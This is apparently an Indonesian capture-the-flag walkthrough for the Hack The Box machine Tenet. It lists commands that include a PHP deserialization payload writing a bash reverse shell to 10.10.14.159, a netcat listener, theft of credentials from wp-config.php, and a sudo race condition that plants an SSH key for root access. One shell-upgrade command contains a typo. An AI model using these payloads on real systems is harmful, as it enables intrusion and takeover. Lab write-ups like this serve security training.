1. nmap
2. buka tenet.htb
3. cek semua post > dari awal
4. di post kedua > ada info kalau database disimpan dalam sebuah file. Dan ada sebuah file sator.php dan backup-annya
5. sator.tenet.htb > tampilan default apache
6. sator.tenet.htb/sator.php
7. sator.tenet.htb/sator.php.bak
8. pakai curl aja
9. buat file rce.php > nano rce.php
10. isi dari rce.php
<?php

class DatabaseExport {
public $user_file ='rce.php';
public $data = '<?php exec("/bin/bash -c \'bash -i >& /dev/tcp/10.10.14.159/1234 0>&1\'") ?>';
}

print urlencode(serialize(new DatabaseExport))

?>

11. save file > jalankan php rce.php. Ini akan dimasukkan ke paramater bernama arepo
12. sator.tenet.htb/sator.php?arepo=xxxxx
13 jalankan listner > rlwrap nc -lvp 1234
14. curl http://sator.tenet.htb/rce.php
15. Nanti akan didapatkan shell
16. upgrade shell
17. python3 -c "import pty;pth.spawn('/bin/bash')"
18. stty raw -echo
19. export TERM=xterm
20. cd wordpress
21. cat wp-config.php > ada username + password untuk SSH
22. ssh dulu


23. id
24. sudo -l
25. cat /usr/bin/.....
26. ada key, merupakan kunci publik ssh
27. pada addkey terdapat celah yang bisa kita manfaatkan
28. ls /tmp
29. rm /tmp/ssh* > remove semua file ssh

30. buat ssh > ssh-keygen > id_rsa
31. cat id_rsa.php
32. copy isinya ke sistem
33. (di sistem) while true; do echo "xxxxxx" | tee /tmp/ssh* > /dev/null; done& (dijalankan sebagai background)
34. sudo -l
35. jalankan binary nya
36. sudo /usr/....
37. jalankan terus sampek bisa
38. Jika sudah sukses, coba ssh saja
39. ssh root@10.10.10.223 -i id_rsa
40. tinggal pindah ke root
